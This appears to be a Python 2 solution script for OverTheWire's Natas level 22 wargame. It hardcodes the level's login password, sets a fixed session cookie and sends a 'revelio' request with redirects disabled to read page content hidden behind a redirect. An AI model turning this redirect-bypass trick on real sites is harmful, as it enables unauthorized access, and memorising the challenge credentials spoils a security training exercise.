#!/bin/python

import requests

url = "http://natas22.natas.labs.overthewire.org/index.php"

user = "natas22"
pwd = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

s = requests.session()

cookies= {"PHPSESSID" : "h4ck3d"}
parameters = "revelio"
r = s.get(url + "?" + parameters, cookies=cookies, auth=(user,pwd), allow_redirects=False)
print r.content